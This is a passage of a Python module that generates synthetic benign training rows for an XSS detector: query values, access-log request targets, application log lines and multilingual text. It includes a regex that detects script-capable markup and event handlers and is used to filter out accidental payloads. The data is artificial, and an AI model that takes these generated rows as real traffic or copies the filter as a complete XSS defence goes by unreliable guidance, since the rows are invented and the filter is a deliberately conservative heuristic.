"""Generated rows for the detector behind the security agent.

The agent (agent.py) hands the detector three shapes of text: values of query
parameters and form fields, request targets cut out of access-log lines, and whole
lines of other logs. Measuring the first neural model (see docs/TRAINING_RESULTS.md)
showed its weakness is false alarms on ordinary text in those shapes: program code,
talk about web security, and text in other scripts. On attacks it was already strong.

So the generators here are mostly about the benign side, in the agent's shapes:

  benign_value     what users and applications put into parameters and fields
  benign_request   request targets as access logs record them
  benign_line      lines of application, server, mail and build logs
  other_attack     SQL injection, path traversal, command injection, SSRF, scanner
                   probes: real attacks, but NOT XSS, so benign rows for THIS detector
  multilingual     text in other scripts and languages

For the attack side this module does not invent new payloads. It reuses the ones the
project already has (the Mereani dataset and xss_augment.synthetic_attack) and only
places a given payload into one of the agent's shapes:

  as_value, as_request, as_line   wrap an existing payload as the agent would see it

`injected()` is a conservative test for script-capable markup, used to keep the
benign generators from ever emitting a real payload by accident.

Everything is generated from a seed. prepare_agent_data.py turns it into CSV files.
"""
from __future__ import annotations

import json
import random
import re
from urllib.parse import quote, quote_plus

import synthetic
from xss_augment import EVENT_HANDLERS, _host

FIRST_NAMES = "ravi priya amit neha arjun kavya rahul anita john maria david sarah ahmed fatima wei yuki carlos sofia ivan olga".split()
LAST_NAMES = "kumar sharma singh patel gupta rao iyer khan smith johnson garcia muller nguyen kim tanaka ivanov rossi silva chen ali".split()
CITIES = "delhi mumbai bengaluru chennai kolkata pune hyderabad london paris berlin tokyo sydney toronto dubai singapore".split()
TECH = """javascript python react angular vue node django flask laravel wordpress jquery typescript html css sql api json xml
oauth jwt docker kubernetes nginx apache redis postgres mongodb graphql webpack linux""".split()
SECURITY_TALK = [  # talk about attacks and browser features, with no markup: the kind of text that got false-flagged
    "xss tutorial", "how to prevent xss", "what is cross-site scripting", "xss vs csrf", "stored xss example explained",
    "content security policy script-src", "javascript onclick example", "onerror handler not firing", "img onerror fallback image",
    "alert box in javascript", "how to use document.cookie", "iframe sandbox attribute", "svg onload animation", "sanitize html input",
    "escape html entities", "dompurify vs sanitize-html", "owasp top 10", "bug bounty xss writeup", "innerhtml vs textcontent",
    "onload vs domcontentloaded", "location.href redirect", "fetch api tutorial", "sql injection cheat sheet", "csrf token missing",
    "clickjacking x-frame-options", "httponly cookie flag", "same origin policy", "cors preflight", "script tag async vs defer",
    "javascript void 0 meaning", "eval is evil", "cookie policy page", "script writing course", "alert fatigue in hospitals",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.5.0", "python-requests/2.31.0", "Go-http-client/1.1", "PostmanRuntime/7.37.0", "okhttp/4.12.0", "-",
]
SCRIPTS = {  # everyday words; the first three are written without spaces between words
    "chinese": "你好 谢谢 请 鞋子 书 水 食物 家 学校 城市 今天 明天 好 新 价格 买 哪里 怎么 什么 我 需要 和 朋友 家庭 时间 工作 市场".split(),
    "japanese": "こんにちは ありがとう お願いします 靴 本 水 食べ物 家 学校 都市 今日 明日 良い 新しい 価格 買う どこ 何 私 必要 友達 家族 時間 仕事 市場".split(),
    "thai": "สวัสดี ขอบคุณ รองเท้า หนังสือ น้ำ อาหาร บ้าน โรงเรียน เมือง วันนี้ ดี ใหม่ ราคา ซื้อ ที่ไหน อะไร เพื่อน ครอบครัว เวลา งาน ตลาด".split(),
    "hindi": "नमस्ते धन्यवाद कृपया जूते किताब पानी खाना घर स्कूल शहर आज कल अच्छा नया कीमत खरीदना कहाँ कैसे क्या मुझे चाहिए दोस्त परिवार समय काम बाज़ार".split(),
    "bengali": "নমস্কার ধন্যবাদ জুতা বই জল খাবার বাড়ি স্কুল শহর আজ কাল ভালো নতুন দাম কেনা কোথায় কেমন বন্ধু পরিবার সময় কাজ বাজার".split(),
    "tamil": "வணக்கம் நன்றி காலணி புத்தகம் தண்ணீர் உணவு வீடு பள்ளி நகரம் இன்று நாளை நல்ல புதிய விலை வாங்க எங்கே என்ன நண்பர் குடும்பம் நேரம் வேலை சந்தை".split(),
    "telugu": "నమస్కారం ధన్యవాదాలు బూట్లు పుస్తకం నీరు ఆహారం ఇల్లు పాఠశాల నగరం ఈరోజు రేపు మంచి కొత్త ధర కొనడం ఎక్కడ ఏమిటి స్నేహితుడు కుటుంబం సమయం పని".split(),
    "russian": "привет спасибо пожалуйста ботинки книга вода еда дом школа город сегодня завтра хороший новый цена купить где как что мне нужно друг семья время работа рынок".split(),
    "greek": "γεια ευχαριστώ παρακαλώ παπούτσια βιβλίο νερό φαγητό σπίτι σχολείο πόλη σήμερα αύριο καλό νέο τιμή αγορά πού τι φίλος οικογένεια χρόνος δουλειά".split(),
    "arabic": "مرحبا شكرا حذاء كتاب ماء طعام بيت مدرسة مدينة اليوم غدا جيد جديد سعر شراء أين كيف صديق عائلة وقت عمل سوق".split(),
    "korean": "안녕하세요 감사합니다 신발 책 물 음식 집 학교 도시 오늘 내일 좋은 새로운 가격 사다 어디 무엇 친구 가족 시간 일 시장".split(),
    "spanish": "hola gracias por favor zapatos libro agua comida casa escuela ciudad hoy mañana bueno nuevo precio comprar dónde cómo amigo familia niño también".split(),
    "french": "bonjour merci chaussures livre eau maison école ville aujourd'hui demain bon nouveau prix acheter comment ami famille très déjà garçon rue".split(),
    "german": "hallo danke bitte schuhe buch wasser essen haus schule stadt heute morgen gut neu preis kaufen wie freund familie zeit größe über straße".split(),
}
_UNSPACED = ("chinese", "japanese", "thai")
_EMOJI = "😀 👍 🎉 ❤️ 🔥 😂 🙏 ✅ ⭐ 🚀".split()

# Conservative: markup that can run script. Used only to THROW OUT candidate benign
# rows, where losing a harmless row costs nothing but keeping a payload poisons labels.
_INJECTED = re.compile(
    r"<\s*/?\s*(?:script|iframe|object|embed|applet|base|frame|layer|bgsound|isindex|svg|math)\b"
    r"|<[a-z!][^<>]*[\s/\"'`]on[a-z]{3,}\s*="           # a tag carrying an event handler
    r"|(?:java|vb)\s*script\s*:|data:\s*text/html|\bsrcdoc\s*=",
    re.I,
)


def injected(text: str) -> bool:
    """True when `text` holds markup that could run script."""
    return bool(_INJECTED.search(text))


def _word(rng: random.Random) -> str:
    return rng.choice(synthetic.WORDS)


def _name(rng: random.Random) -> str:
    return rng.choice([rng.choice(FIRST_NAMES), f"{rng.choice(FIRST_NAMES)} {rng.choice(LAST_NAMES)}", rng.choice(LAST_NAMES)])


def _ip(rng: random.Random) -> str:
    return f"{rng.choice(['203.0.113', '198.51.100', '192.0.2', '10.0.0', '172.16.4', '192.168.1'])}.{rng.randint(1, 254)}"


def _hex(rng: random.Random, length: int) -> str:
    return "".join(rng.choice("0123456789abcdef") for _ in range(length))


def _base64ish(rng: random.Random, length: int, extra: str = "+/") -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" + extra
    return "".join(rng.choice(chars) for _ in range(length))


def _stamp(rng: random.Random, style: int | None = None) -> str:
    year, month, day = rng.randint(2023, 2026), rng.randint(1, 12), rng.randint(1, 28)
    hour, minute, second, milli = rng.randint(0, 23), rng.randint(0, 59), rng.randint(0, 59), rng.randint(0, 999)
    name = "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split()[month - 1]
    return [
        f"{year}-{month:02d}-{day:02d} {hour:02d}:{minute:02d}:{second:02d},{milli:03d}",
        f"{year}-{month:02d}-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}.{milli:03d}Z",
        f"{year}-{month:02d}-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}+05:30",
        f"{name} {day:2d} {hour:02d}:{minute:02d}:{second:02d}",
        f"{day:02d}/{name}/{year}:{hour:02d}:{minute:02d}:{second:02d} +0000",
        f"{year}/{month:02d}/{day:02d} {hour:02d}:{minute:02d}:{second:02d}",
        f"{year}-{month:02d}-{day:02d} {hour:02d}:{minute:02d}:{second:02d}",
    ][rng.randrange(7) if style is None else style]


def _token(rng: random.Random) -> str:
    """Identifiers and opaque tokens: the long random strings that fill real requests."""
    kind = rng.randrange(8)
    if kind == 0:
        return "-".join(_hex(rng, n) for n in (8, 4, 4, 4, 12))
    if kind == 1:  # shaped like a signed web token: three base64url parts
        return f"eyJ{_base64ish(rng, rng.randint(20, 40), '-_')}.eyJ{_base64ish(rng, rng.randint(30, 140), '-_')}.{_base64ish(rng, 43, '-_')}"
    if kind == 2:
        return _hex(rng, rng.choice([16, 32, 40, 64]))
    if kind == 3:
        return _base64ish(rng, rng.choice([22, 43, 86, 150, 300])) + rng.choice(["", "=", "=="])
    if kind == 4:
        return f"{rng.choice(['csrf', 'sess', 'tok', 'req', 'trace', 'cart'])}{rng.choice(['_', '-', ':'])}{_hex(rng, rng.choice([12, 24, 32]))}"
    if kind == 5:
        return str(rng.randint(1, 10 ** rng.randint(2, 12)))
    if kind == 6:
        return _base64ish(rng, rng.choice([8, 11, 16]), "-_")
    return f"{rng.choice(['GA1.2', 'fb.1', 'amp'])}.{rng.randint(10 ** 8, 10 ** 10)}.{rng.randint(10 ** 9, 10 ** 10)}"


# ---- benign: parameter and form-field values ------------------------------------


def benign_value(rng: random.Random) -> str:
    """A harmless value of a query parameter or form field."""
    a, b, c = _word(rng), _word(rng), _word(rng)
    n, m = rng.randint(1, 9999), rng.randint(1, 500)
    kind = rng.randrange(23)
    if kind == 0:
        return " ".join(rng.choice(synthetic.WORDS + TECH + CITIES) for _ in range(rng.randint(1, 5)))
    if kind == 1:  # searches with operators and punctuation that look alarming but are not
        return rng.choice([f'"{a} {b}"', f"{a} -{b}", f"site:{_host(rng)} {a}", f"{a} OR {b}", f"c++ vector<{rng.choice(['int', 'string', 'T'])}>",
                           f"{a} < {n}", f"{a} > {m} {b}", f"{a} & {b}", f"what's the best {a} under {n}?", f"{a}'s {b} {c}", f"{a} + {b}",
                           f"{rng.choice(TECH)} {a} example", f"how to {a} a {b} in {rng.choice(TECH)}", f"{a}, {b} & {c}", f"#{a} @{b}", f"{a}?"])
    if kind == 2:
        return _name(rng)
    if kind == 3:
        return synthetic._email(rng)
    if kind == 4:
        return rng.choice([f"+{rng.randint(1, 99)} {rng.randint(10000, 99999)} {rng.randint(10000, 99999)}",
                           f"({rng.randint(100, 999)}) {rng.randint(100, 999)}-{rng.randint(1000, 9999)}", str(rng.randint(6 * 10 ** 9, 10 ** 10 - 1))])
    if kind == 5:
        return rng.choice([f"{m}, {a} road, {rng.choice(CITIES)} {rng.randint(100000, 999999)}", f"flat {m}{rng.choice('abcd')}, {n} {a} street",
                           f"{rng.choice(CITIES)}, {rng.choice(['india', 'uk', 'usa', 'uae', 'japan'])}"])
    if kind == 6:
        return rng.choice([_stamp(rng), _stamp(rng, 6)[:10], f"{rng.randint(1, 12)}/{rng.randint(1, 28)}/{rng.randint(2020, 2026)}",
                           f"{rng.randint(0, 23):02d}:{rng.randint(0, 59):02d}", rng.choice(["today", "last 7 days", "this month", "asia/kolkata", "utc+05:30"])])
    if kind == 7:
        return rng.choice([f"{n:,}.{rng.randint(0, 99):02d}", f"{m}-{n}", f"${n}.99", f"{m}%", f"{rng.uniform(-90, 90):.4f},{rng.uniform(-180, 180):.4f}",
                           f"{n}x{m}", f"#{_hex(rng, 6)}", f"rgb({rng.randint(0, 255)}, {rng.randint(0, 255)}, {rng.randint(0, 255)})", f"{m}px", f"{rng.randint(1, 5)} stars"])
    if kind == 8:
        return _token(rng)
    if kind == 9:
        return rng.choice([f"/{a}/{b}", f"/{a}/{b}/{n}", f"../{a}/{b}.png", f"/{a}?{rng.choice(synthetic.PARAMS)}={synthetic.value(rng)}", f"{a}/{b}/{c}.html", "/"])
    if kind == 10:
        inner = synthetic.url(rng)
        return rng.choice([inner, inner, f"https://{_host(rng)}/{a}/callback", f"{inner}#{b}", f"//{_host(rng)}/{a}.png"])
    if kind == 11:
        return rng.choice(synthetic.FIXED_VALUES + ["en-gb", "hi-in", "utf-8", "relevance", "created_at:desc", "name,-price", "light", "dark", "on", "off", "yes", "*"])
    if kind == 12:
        return rng.choice([json.dumps({a: b, "order": rng.choice(["asc", "desc"])}), json.dumps([n, m, rng.randint(1, 99)]),
                           json.dumps({"filters": {a: [b, c]}, "page": m}), json.dumps({"q": f"{a} {b}", "tags": [b, c]}, separators=(",", ":"))])
    if kind == 13:
        return rng.choice(USER_AGENTS[:-1] + ["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "gzip, deflate, br",
                                              "en-US,en;q=0.9,hi;q=0.8", "application/json; charset=utf-8", "max-age=31536000; includeSubDomains",
                                              f"session={_hex(rng, 24)}; theme=dark; lang=en", "keep-alive", "XMLHttpRequest"])
    if kind == 14:  # free text as people type it into comment and feedback fields
        text = synthetic.sentence(rng)
        return rng.choice([f"{text} <3", f"{text} :)", f"{a} -> {b}", f"{text} {text}", f"i love this {a}!!! {rng.choice(_EMOJI)}", f">> {text}", f"{a} & {b} are {c}",
                           f'he said "{a} {b}" and left', f"it's {a}, isn't it?", f"{a} / {b} / {c}", f"re: {text}", f"1) {a} 2) {b} 3) {c}", f"p.s. {text}"])
    if kind == 15:  # comparisons and formulas: angle brackets used as maths, not markup
        return rng.choice([f"{m} < {n}", f"{a} > {b}", f"{a} <= {b} && {c} >= {n}", f"{m} + {n} = {m + n}", f"({a}+{b})*({c}-{m})/2", f"x^2 + {m}x + {n} = 0",
                           f"{a} != {b}", f"if {a} < {n} then {b}", f"{m} < x < {n}", "a<b", f"{a}>{b}", f"<{m}", f">{n}", f"{a} => {b}"])
    if kind == 16:
        return rng.choice([f"**{a}** and _{b}_", f"[{a} {b}](https://{_host(rng)}/{c})", f"> {synthetic.sentence(rng)}", f"`{a}.{b}()`", f"# {a} {b}",
                           f"~~{a}~~ {b}", f"{a} | {b} | {c}", f"![{a}](/{b}/{c}.png)", f"@{a} see #{n}"])
    if kind == 17:  # security talk: the words from attacks, with nothing injected
        talk = rng.choice(SECURITY_TALK)
        return rng.choice([talk, talk, f"{talk} {a}", f"{rng.choice(TECH)} {talk}", f"best {talk} for {rng.choice(TECH)}", f"{talk}?", f"{a} {talk} {b}"])
    if kind == 18:
        return rng.choice([f"{a} {b} (final).pdf", f"v{rng.randint(0, 9)}.{rng.randint(0, 20)}.{rng.randint(0, 99)}", f"{a}-{b}.min.js",
                           f"c:\\users\\{rng.choice(FIRST_NAMES)}\\documents\\{a}.docx", f"/home/{rng.choice(FIRST_NAMES)}/{a}/{b}.py", f"img_{n}.jpeg"])
    if kind == 19:  # placeholders and template variables that programs leak into fields
        return rng.choice(["<none>", "<unknown>", "<empty>", "n/a", "--", "{{" + a + "}}", "{{ " + a + "." + b + " }}", "${" + a + "}", "%s", "{0}",
                           f"<your {a} here>", "[object Object]", "undefined", "null", "NaN", "true", "[]", "{}", f":{a}", "<redacted>", "<br>", "<p>"])
    if kind == 20:  # names of functions, events and callbacks on their own, with no call
        return rng.choice([rng.choice(EVENT_HANDLERS), rng.choice(EVENT_HANDLERS)[2:], "eval", "alert", "callback",
                           f"jQuery{rng.randint(10 ** 15, 10 ** 17)}_{rng.randint(10 ** 12, 10 ** 13)}", f"handle{a.capitalize()}", f"on{a.capitalize()}Change",
                           f"{a}_callback", "document.ready", "init", f"__{a}__"])
    if kind == 21:  # rich-text and markdown fields: harmless inline markup and fenced code
        snippet = rng.choice([f'print("{synthetic.phrase(rng, 1, 3)}")', f"console.log({a})", f"{a} = {b} + {c}", f"for i in range({n}): {a}(i)",
                              f"SELECT {a} FROM {b} WHERE {c} = {n}", f"def {a}({b}): return {b}", f"{a}.{b}().then(r => r.json())"])
        return rng.choice([f"<b>{a}</b>", f"<p>{synthetic.sentence(rng)}</p>", f"<i>{a} {b}</i>", f"{a}<br>{b}", f"<strong>{a}</strong> {b}", f"<em>{a}</em>",
                           f"<h2>{a} {b}</h2>", f"<ul><li>{a}</li><li>{b}</li></ul>", f'<a href="https://{_host(rng)}/{a}">{b}</a>', f'<span class="{a}">{b}</span>',
                           f"<code>{snippet}</code>", f"<pre>{snippet}</pre>", f"<pre><code>{snippet}</code></pre>", f"`{snippet}`", f"```\n{snippet}\n```",
                           f"```{rng.choice(['python', 'js', 'sql', ''])}\n{snippet}\n```", f"<blockquote>{synthetic.sentence(rng)}</blockquote>", f"<kbd>ctrl</kbd>+<kbd>{a[0]}</kbd>"])
    return multilingual(rng, plain=True)


# ---- benign: request targets ----------------------------------------------------


def _encode(text: str, rng: random.Random) -> str:
    """One of the ways clients write a value into a URL."""
    roll = rng.random()
    if roll < 0.45:
        return quote_plus(text)
    if roll < 0.75:
        return quote(text, safe="")
    if roll < 0.9:
        return quote(text, safe="/:,@!*'()$[]=")
    return text.replace(" ", "+")


def _path(rng: random.Random) -> str:
    a, b, c = _word(rng), _word(rng), _word(rng)
    n = rng.randint(1, 99999)
    kind = rng.randrange(12)
    if kind == 0:
        return "/"
    if kind == 1:
        folder = rng.choice(["static", "assets", "dist", "_next/static/chunks", "build/js", "public/css", "media", "wp-content/themes/" + a, "wp-includes/js"])
        name = rng.choice([a, f"{a}.{_hex(rng, 8)}", f"{a}-{b}.min", f"{a}.bundle", f"{n}-{_hex(rng, 16)}"])
        return f"/{folder}/{name}.{rng.choice(['js', 'css', 'png', 'jpg', 'svg', 'woff2', 'ico', 'js.map', 'json', 'webp', 'gif'])}"
    if kind == 2:
        tail = rng.choice(["", f"/{n}", f"/{n}/{b}s", f"/{_token(rng)}", f"/{b}", f"/{n}/{b}s/{rng.randint(1, 999)}"])
        return f"/{rng.choice(['api', 'api/v1', 'api/v2', 'rest', 'v1', 'internal/api'])}/{a}s{tail}"
    if kind == 3:
        return rng.choice(["/wp-admin/admin-ajax.php", "/wp-json/wp/v2/posts", f"/wp-content/uploads/{rng.randint(2015, 2026)}/{rng.randint(1, 12):02d}/{a}-{b}.jpg",
                           "/wp-login.php", "/feed/", f"/category/{a}/", f"/tag/{a}-{b}/", f"/{rng.randint(2015, 2026)}/{rng.randint(1, 12):02d}/{a}-{b}-{c}/"])
    if kind == 4:
        return f"/{a}/{b}-{c}{rng.choice(synthetic.PAGE_ENDINGS)}"
    if kind == 5:
        return rng.choice(["/favicon.ico", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/health", "/healthz", "/metrics", "/manifest.json",
                           "/apple-touch-icon.png", "/ads.txt", "/sw.js", "/index.html", "/status", "/ping", "/.well-known/acme-challenge/" + _base64ish(rng, 43, "-_")])
    if kind == 6:
        return f"/{rng.choice(['blog', 'news', 'articles', 'docs'])}/{rng.randint(2015, 2026)}/{rng.randint(1, 12):02d}/{'-'.join(rng.choice(synthetic.WORDS + TECH) for _ in range(rng.randint(2, 6)))}"
    if kind == 7:
        return rng.choice([f"/users/{rng.choice(FIRST_NAMES)}", f"/@{rng.choice(FIRST_NAMES)}{rng.randint(1, 99)}", f"/u/{quote(_name(rng))}/profile", f"/profile/{n}/edit"])
    if kind == 8:
        return f"/{rng.choice(['files', 'download', 'docs', 'uploads'])}/{quote(f'{a} {b} ({rng.randint(1, 9)})')}.{rng.choice(['pdf', 'docx', 'xlsx', 'zip', 'csv'])}"
    if kind == 9:
        return f"/{rng.choice(['en', 'hi', 'fr', 'de', 'en-us', 'pt-br', 'ja'])}/{a}/{b}"
    if kind == 10:
        return rng.choice([f"/{a}.php", f"/{a}/{b}.aspx", "/index.php", f"/cgi-bin/{a}.cgi", f"/{a}.jsp", f"/{a}/{b}.do", f"/servlet/{a.capitalize()}{b.capitalize()}"])
    return f"/{rng.choice(['docs', 'tags', 'learn', 'topics', 'wiki'])}/{rng.choice(SECURITY_TALK + TECH).replace(' ', '-')}"  # e.g. /tags/script


def _query(rng: random.Random) -> list[tuple[str, str]]:
    """Parameter names with still-unencoded values, in combinations real pages use."""
    a, b = _word(rng), _word(rng)
    theme = rng.randrange(10)
    if theme == 0:
        return [(rng.choice(synthetic.PARAMS), benign_value(rng)) for _ in range(rng.randint(1, 4))]
    if theme == 1:
        return [("utm_source", rng.choice(["newsletter", "google", "twitter", a])), ("utm_medium", rng.choice(["email", "cpc", "social"])), ("utm_campaign", f"{a}_{b}"),
                *rng.sample([("gclid", _base64ish(rng, 40, "-_")), ("ref", a), ("mc_cid", _hex(rng, 10))], rng.randint(0, 2))]
    if theme == 2:
        back = rng.choice([f"/{a}/{b}", f"/{a}?{b}={rng.randint(1, 99)}", f"https://{_host(rng)}/{a}/callback"])
        return rng.choice([[(rng.choice(["next", "return_to", "redirect", "continue", "returnUrl", "goto"]), back)],
                           [("client_id", _hex(rng, 16)), ("redirect_uri", back), ("response_type", "code"), ("scope", "openid profile email"), ("state", _base64ish(rng, 16, "-_"))]])
    if theme == 3:
        return rng.sample([("page", str(rng.randint(1, 500))), ("per_page", rng.choice(["10", "20", "50", "100"])), ("limit", str(rng.randint(1, 200))), ("offset", str(rng.randint(0, 5000))),
                           ("sort", rng.choice(["price_asc", "-created_at", "name", "relevance"])), ("order", rng.choice(["asc", "desc"])), (f"filter[{a}]", b),
                           (f"filter[{a}][gte]", str(rng.randint(1, 999))), ("ids[]", str(rng.randint(1, 999))), ("fields", f"id,{a},{b}"), ("cursor", _base64ish(rng, 24))],
                          rng.randint(1, 5))
    if theme == 4:
        return [(rng.choice(["q", "query", "search", "s", "keyword", "term", "text"]), benign_value(rng)), *([("page", str(rng.randint(1, 40)))] if rng.random() < 0.3 else [])]
    if theme == 5:  # analytics beacon
        return [("v", "1"), ("tid", f"UA-{rng.randint(10 ** 6, 10 ** 8)}-{rng.randint(1, 9)}"), ("cid", f"{rng.randint(10 ** 8, 10 ** 10)}.{rng.randint(10 ** 9, 10 ** 10)}"),
                ("dl", synthetic.url(rng)), ("dt", synthetic.phrase(rng, 1, 5).title()), ("sr", rng.choice(["1920x1080", "390x844", "1366x768"])), ("ul", "en-us")]
    if theme == 6:
        return [("query", rng.choice(["{user(id:%d){name,email}}" % rng.randint(1, 999), "query{%s(first:%d){id,%s}}" % (a, rng.randint(1, 50), b)]))]
    if theme == 7:
        return [("callback", f"jQuery{rng.randint(10 ** 15, 10 ** 17)}_{rng.randint(10 ** 12, 10 ** 13)}"), (rng.choice(synthetic.PARAMS), synthetic.value(rng)), ("_", str(rng.randint(10 ** 12, 2 * 10 ** 12)))]
    if theme == 8:
        return rng.choice([[("EIO", "4"), ("transport", rng.choice(["polling", "websocket"])), ("t", _base64ish(rng, 7, "-_"))],
                           [("action", rng.choice(["heartbeat", "get_cart", "load_more", f"{a}_{b}"])), ("nonce", _hex(rng, 10))],
                           [("v", f"{rng.randint(1, 9)}.{rng.randint(0, 20)}.{rng.randint(0, 99)}")], [("token", _token(rng))], [("p", str(rng.randint(1, 9999)))],
                           [("lang", rng.choice(["en", "hi", "fr"])), ("theme", rng.choice(["dark", "light"]))]])
    return [(rng.choice(["q", "name", "title", "city", "msg", "comment"]), multilingual(rng, plain=True))]


def _target_with(path: str, pairs: list[tuple[str, str]], rng: random.Random) -> str:
    out = path + ("?" + "&".join(f"{key}={value}" for key, value in pairs) if pairs else "")
    if rng.random() < 0.08:  # proxies and load balancers log the absolute URL
        out = f"{rng.choice(['http', 'https'])}://{_host(rng)}{rng.choice(['', '', ':80', ':443', ':8080'])}{out}"
    return out


def benign_request(rng: random.Random) -> str:
    """The request target of an ordinary request, as an access log records it."""
    path = _path(rng)
    static = re.search(r"\.(?:js|css|png|jpg|svg|woff2|ico|map|webp|gif|txt|xml)$", path)
    pairs = [] if rng.random() < (0.8 if static else 0.25) else _query(rng)
    return _target_with(path, [(key, _encode(value, rng)) for key, value in pairs], rng)


# ---- benign: log lines ----------------------------------------------------------


def _message(rng: random.Random) -> str:
    a, b, c = _word(rng), _word(rng), _word(rng)
    n, m, port = rng.randint(1, 99999), rng.randint(1, 900), rng.choice([80, 443, 3000, 5432, 6379, 8080, 9200])
    return rng.choice([
        f"order {n} created for user {rng.randint(1, 9999)}", f"request completed in {m} ms", f"cache {rng.choice(['hit', 'miss'])} key={a}:{n}:{b} ttl={rng.choice([60, 300, 3600])}",
        f"rate limit exceeded for {_ip(rng)} on /api/{a} ({rng.randint(5, 50)} req/s)", f"user {rng.choice(FIRST_NAMES)} logged in from {_ip(rng)}",
        f"Failed password for invalid user {a} from {_ip(rng)} port {rng.randint(1024, 65535)} ssh2", f"connection to {a}-db:{port} timed out after {m}ms",
        f'sending email to <{synthetic._email(rng)}> subject="{synthetic.phrase(rng, 1, 4)}"', f"job {a}_{b} finished: {n} rows processed, {rng.randint(0, 20)} skipped",
        f"template {a}/{b}.html rendered in {m}ms", f"invalid value for parameter '{rng.choice(synthetic.PARAMS)}': expected {rng.choice(['int', 'string', 'date'])}",
        f"slow query ({rng.uniform(1, 30):.2f}s): SELECT {a}, {b} FROM {c} WHERE {a} < {n} AND {b} > {m}", f"GET /api/{a}/{n} -> {rng.choice([200, 201, 204, 301, 304, 400, 404, 500])} ({m}ms)",
        f"listening on http://0.0.0.0:{port}", f"csp violation: blocked-uri=inline violated-directive=script-src 'self' document-uri=https://{_host(rng)}/{a}",
        f"DeprecationWarning: {a}.{b}() will be removed in v{rng.randint(2, 9)}.0", f"upload {a}.{rng.choice(['png', 'pdf', 'csv'])} ({n} bytes) stored as {_hex(rng, 32)}",
        "websocket closed code=1006 reason=<empty>", f"feature flag {a}_{b} = {rng.choice(['true', 'false'])} for tenant {n}",
        f"retrying ({rng.randint(1, 5)}/5) after error: connect ECONNREFUSED 127.0.0.1:{port}", f"xss filter: 0 of {n} values flagged", f"waf: request allowed score={rng.randint(0, 4)} rules=none",
        f"session {_hex(rng, 16)} expired; redirecting to /login?next=%2F{a}", f"{rng.choice(SECURITY_TALK)}: check passed for {a}/{b}", f"payment {_token(rng)} authorised for {n}",
        f'search q="{benign_value(rng)[:80]}" returned {n} results in {m}ms', f"heap used {m}MB of {n}MB (gc pause {rng.randint(1, 90)}ms)", f"{a}: {b} -> {c} ({m} items)",
        f"validation failed: {a} must be < {n} and > {m}", f"imported {n} {a}s from {a}_{b}.csv", f"cron: ({rng.choice(['root', 'www-data'])}) CMD (/usr/bin/{a} --{b} > /dev/null 2>&1)",
    ])


def _trace(rng: random.Random) -> str:
    a, b, c = _word(rng), _word(rng), _word(rng)
    n, m = rng.randint(1, 900), rng.randint(1, 80)
    return rng.choice([
        f"at com.{a}.{b}.{c.capitalize()}Service.lambda${a}$0({c.capitalize()}Service.java:{n})", "at java.base/java.lang.Thread.run(Thread.java:840)",
        f'Caused by: java.lang.NullPointerException: Cannot invoke "String.length()" because "<local{m}>" is null', f"at {a}.{b}.<init>({b.capitalize()}.java:{n})",
        f'File "/app/{a}/{b}.py", line {n}, in <module>', f'File "<stdin>", line {m}, in <module>', f'  File "/usr/lib/python3.12/site-packages/{a}/{b}.py", line {n}, in {c}',
        f"{a.capitalize()}Error: {b} object has no attribute '{c}'", f"KeyError: '{a}'", f"at Object.<anonymous> (/app/{a}/{b}.js:{n}:{m})", f"at <anonymous>:{m}:{n}",
        f"TypeError: Cannot read properties of undefined (reading '{a}')", f"Uncaught ReferenceError: {a} is not defined", f"SyntaxError: Unexpected token '<' in JSON at position {m}",
        f"panic: runtime error: index out of range [{m}] with length {m}", f"goroutine {m} [running]:", f"thread '<unnamed>' panicked at src/{a}.rs:{n}:{m}",
        f"ERROR 1064 (42000): You have an error in your SQL syntax near 'FROM {a}' at line {m}", f"PHP Warning:  Undefined variable ${a} in /var/www/html/{b}.php on line {n}",
        f"{n}:{m}  error  '{a}' is defined but never used  no-unused-vars", f"npm WARN deprecated {a}@{rng.randint(0, 9)}.{m}.{rng.randint(0, 9)}: use {b} instead",
        f"webpack compiled with {m} warnings in {n} ms", f"FAILED tests/test_{a}.py::test_{b} - AssertionError: assert {n} == {m}",
        f"warning: unused variable: `{a}` --> src/{b}.rs:{n}:{m}", f"{a}.c:{n}:{m}: error: expected ';' before '}}' token",
    ])


def _combined_line(target: str, rng: random.Random, method: str | None = None) -> str:
    """One line of an Apache or nginx access log in the combined format."""
    method = method or rng.choice(["GET"] * 8 + ["POST", "HEAD"])
    status = rng.choice([200] * 10 + [301, 302, 304, 304, 400, 403, 404, 404, 500])
    referer = rng.choice(["-", "-", "-", synthetic.url(rng), f"https://www.google.com/search?q={quote_plus(synthetic.phrase(rng, 1, 3))}"])
    return (f'{_ip(rng)} - {rng.choice(["-", "-", "-", rng.choice(FIRST_NAMES)])} [{_stamp(rng, 4)}] "{method} {target} HTTP/{rng.choice(["1.1", "1.1", "2.0"])}" '
            f'{status} {rng.randint(0, 90000)} "{referer}" "{rng.choice(USER_AGENTS)}"')


def benign_line(rng: random.Random) -> str:
    """A line of a log that is not a plain access log: application, server, mail and build logs."""
    a, b = _word(rng), _word(rng)
    level, message = rng.choice(["INFO", "INFO", "INFO", "WARN", "ERROR", "DEBUG"]), _message(rng)
    target = benign_request(rng)
    path, _, query = target.partition("?")
    kind = rng.randrange(15)
    if kind == 0:
